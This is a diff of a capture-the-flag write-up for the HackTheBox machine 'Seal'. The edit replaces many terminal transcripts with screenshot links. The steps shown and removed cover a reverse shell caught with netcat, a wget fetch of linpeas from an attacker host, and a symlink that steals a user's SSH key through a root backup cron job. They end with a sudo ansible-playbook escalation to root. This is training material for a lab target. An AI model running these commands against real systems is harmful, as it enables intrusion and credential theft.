@@ -210,7 +210,8 @@ To bypass this, intecept the war upload request to `/manager/status/..;/html` us
 Go back to `https://seal.htb/manager/status/..;/html` to verify the successful payload upload.
 ![success](screenshots/success.png)
 
-Start a listener with `nc -lvnp 1337` and then visit https://seal.htb/payload/lyibvpiewin.jsp in the web browser to abuse code execution.
+Start a listener with `nc -lvnp 1337` and then visit https://seal.htb/payload/ in the web browser to abuse code execution.
+![revshell](screenshots/revshell.png)
 
 Upgrade the shell with
 ```
@@ -218,26 +219,19 @@ python3 -c "__import__('pty').spawn('/bin/bash')"
 Ctrl+Z
 stty -echo raw
 fg
-export TERM=linux
+export TERM=xterm
+stty rows 38 columns 155
 ```
 
 Run linpeas
-```
-sadeli@attacker: ~$ python3 -m http.server 8000
-tomcat@seal:/var/lib/tomcat9$ cd /tmp
-tomcat@seal:/tmp$ wget http://attacker_ip:8000/linpeas.sh
-tomcat@seal:/tmp$ chmod +x linpeas.sh
-tomcat@seal:/tmp$ ./linpeas.sh | tee linpeas.txt
-tomcat@seal:/tmp$ less -r /tmp/linpeas.txt
-```
+![wget linpeas](screenshots/wget_linpeas.png)
 
-There appears to be two cron jobs running as root:
-```
-root       27938  0.0  0.0   8356  3344 ?        S    06:51   0:00  _ /usr/sbin/CRON -f
-root       27939  0.0  0.0   2608   600 ?        Ss   06:51   0:00      _ /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
-```
+There appears to be a cron job running as root. It is running the program `/usr/bin/ansible-playbook /opt/backups/playbook/run.yml` as the user *luis*.
+![cron](screenshots/cron.png)
 
 Inspect the contents of /opt/backups/playbook/run.yml
+
+This ansible playbook makes a backup up of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` and saves it to `/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz`. According to the [ansible documentation](https://docs.ansible.com/ansible/latest/collections/ansible/posix/synchronize_module.html), the flag `copy_links=yes` will "Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink".
 ```
 tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
 - hosts: localhost
@@ -255,7 +249,7 @@ tomcat@seal:/tmp$ cat /opt/backups/playbook/run.yml
 tomcat@seal:/tmp$
 ```
 
-This ansible playbook makes a backup up of `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` and saves it to `/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz` while preserving symlinks. View the contents of the dashboard. Everyone has full write access to the uploads directory.
+Visit the directory `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` to see what the playbook is making a copy of. Note that the directory `uploads` has full write permissions, which means anyone can attatch a symlink to it.
 ```
 tomcat@seal:/tmp$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
 tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ ls -la
@@ -271,68 +265,23 @@ drwxrwxrwx 2 root root  4096 Oct 14 07:03 uploads
 tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ 
 ```
 
-Run the command `ln -sf /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads` and wait for the cron job to make the backup.
+To make a symlink from luis's `.ssh` directory to the `uploads` directory, run the command 
 ```
-tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd uploads
-tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -la
-total 8
-drwxrwxrwx 2 root   root   4096 Oct 14 07:03 .
-drwxr-xr-x 7 root   root   4096 May  7 09:26 ..
-lrwxrwxrwx 1 tomcat tomcat   16 Oct 14 07:03 .ssh -> /home/luis/.ssh/
-tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$
+ln -sf /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
 ```
+and wait for the cron job to make the backup.
+![symlink](screenshots/symlink.png)
 
-Copy and extract the archive
-```
-tomcat@seal:/tmp$ ls /opt/backups/archives/
-backup-2021-10-14-07:51:32.gz  backup-2021-10-14-07:53:32.gz
-tomcat@seal:/tmp$ cp /opt/backups/archives/backup-2021-10-14-07:53:32.gz /tmp/bak.gz
-tomcat@seal:/tmp$ gzip -d bak.gz
-tomcat@seal:/tmp$ tar -xvf bak
-```
+Since the ansible playbook saves the backup to the `/opt/backups/archives/` directory, the .gz file should be located there. It appears that there are new backups every minute. Download the most recent archive, which should contain the archived directory `/home/luis/.ssh` under the uploads. This reveals the archived `dashboard` with luis's ssh key.
+![backups](screenshots/backups.png)
 
-This reveals the archived `dashboard` with luis's ssh key
-```
-tomcat@seal:/tmp$ cd dashboard/uploads/.ssh/
-tomcat@seal:/tmp/dashboard/uploads/.ssh$ ssh -i id_rsa luis@127.0.0.1
-Could not create directory '/.ssh'.
-The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
-ECDSA key fingerprint is SHA256:YTRJC++A+0ww97kJGc5DWAsnI9iusyCE4Nt9fomhxdA.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-luis@seal:~$ 
-```
+Use `id_rsa` to log in as luis.
+![luils](screenshots/luis.png)
 
 ## Privilege Escalation and root.txt
 
 View programs luis can run as root. luis may run `/usr/bin/ansible-playbook *` as root without a password.
-```
-luis@seal:~$ sudo -l
-Matching Defaults entries for luis on seal:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User luis may run the following commands on seal:
-    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
-luis@seal:~$
-```
+![sudo list](screenshots/sudo_list.png)
 
 Follow the gtfobins guide for privilege escalation https://gtfobins.github.io/gtfobins/ansible-playbook/#sudo
-```
-luis@seal:~$ TF=$(mktemp)
-luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
-luis@seal:~$ sudo ansible-playbook $TF
-[WARNING]: provided hosts list is empty, only localhost is available. Note that
-the implicit localhost does not match 'all'
-
-PLAY [localhost] ***************************************************************
-
-TASK [Gathering Facts] *********************************************************
-ok: [localhost]
-
-TASK [shell] *******************************************************************
-# whoami
-root
-# id
-uid=0(root) gid=0(root) groups=0(root)
-#
-```
+![gtfobins](screenshots/gtfobins.png)
